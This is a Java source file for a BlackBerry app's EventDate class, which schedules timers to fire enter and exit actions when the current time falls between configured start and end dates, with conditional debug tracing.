//#preprocess
package blackberry.event;

import java.util.Calendar;
import java.util.Date;
import java.util.TimeZone;

import blackberry.config.ConfEvent;
import blackberry.config.ConfigurationException;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class EventDate extends Event {
    //#ifdef DEBUG
    private static Debug debug = new Debug("EventDate", DebugLevel.VERBOSE);
    //#endif

    private Date dateFrom;
    private Date dateTo;

    Calendar start;
    Calendar stop;

    private boolean nextDailyIn;
    private boolean needExit = false;

    protected boolean parse(ConfEvent event) {

        try {
            needExit = false;
            dateFrom = conf.getDate("datefrom");

            if (conf.has("dateto")) {
                dateTo = conf.getDate("dateto");
            } else {
                dateTo = new Date(Long.MAX_VALUE);
            }
        } catch (ConfigurationException e) {
            return false;
        }

        return true;
    }

    public void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart");
        //#endif
        start = Calendar.getInstance(TimeZone.getTimeZone("GMT"));
        start.setTime(dateFrom);
        stop = Calendar.getInstance(TimeZone.getTimeZone("GMT"));
        stop.setTime(dateTo);

        Calendar now = Calendar.getInstance(TimeZone.getTimeZone("GMT"));
        //#ifdef DEBUG
        debug.trace("actualStart from: " + start.getTime() + " to: "
                + stop.getTime() + " now: " + now.getTime());
        //#endif

        if (now.before(start)) {
            //#ifdef DEBUG
            debug.trace(" (actualStart): not yet in the brackets");
            //#endif
            nextDailyIn = setDailyDelay();
            //#ifdef DBC
            Check.asserts(nextDailyIn == true, "nextDailyIn should be true");
            //#endif
        } else if (now.before(stop)) {
            //#ifdef DEBUG
            debug.trace(" (actualStart): already in the brackets, don't reschedule, let's go");
            //#endif
            nextDailyIn = true;

        } else {
            //#ifdef DEBUG
            debug.trace(" (actualStart): nothing to do");
            //#endif
            //#ifdef DBC
            Check.asserts(nextDailyIn == false, "nextDailyIn should be false");
            //#endif
        }
    }

    public void actualGo() {
        //#ifdef DEBUG
        debug.trace("actualGo");
        //#endif        

        if (nextDailyIn) {
            //#ifdef DEBUG
            debug.trace(" (go): DAILY TIMER: action enter"); //$NON-NLS-1$
            //#endif
            onEnter();
            needExit = true;
        } else {
            //#ifdef DEBUG
            debug.trace(" (go): DAILY TIMER: action exit"); //$NON-NLS-1$
            //#endif
            onExit();
            needExit = false;
        }

        //#ifdef DEBUG
        debug.trace(" (go): daily IN BEFORE: " + nextDailyIn); //$NON-NLS-1$
        //#endif
        nextDailyIn = setDailyDelay();
        //#ifdef DEBUG
        debug.trace(" (go): daily IN AFTER: " + nextDailyIn); //$NON-NLS-1$
        //#endif

    }

    public void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop");
        //#endif

        if (needExit) {
            onExit(); // di sicurezza
        }
    }

    private boolean setDailyDelay() {
        Calendar now = Calendar.getInstance(TimeZone.getTimeZone("GMT"));
    
        //#ifdef DEBUG
        debug.trace("setDailyDelay start: " + start.getTime().getTime());
        debug.trace("setDailyDelay stop: " + start.getTime().getTime());
        //#endif
        long period;
        if (now.before(start)) {
            period = (start.getTime().getTime() - now.getTime().getTime());
            //#ifdef DEBUG
            debug.trace("setDailyDelay (now before start) new period:" + period);
            //#endif
            setDelay(period);
            reschedule();
            return true;
        } else if (now.before(stop)) {
            period = (stop.getTime().getTime() - now.getTime().getTime());
            //#ifdef DEBUG
            debug.trace("setDailyDelay (now before stop) new period:" + period);
            //#endif
            setDelay(period);
            reschedule();
            return false;
        } else {
            this.onExit();
            setDelay(NEVER);
            reschedule();
            return false;
        }
    }

}
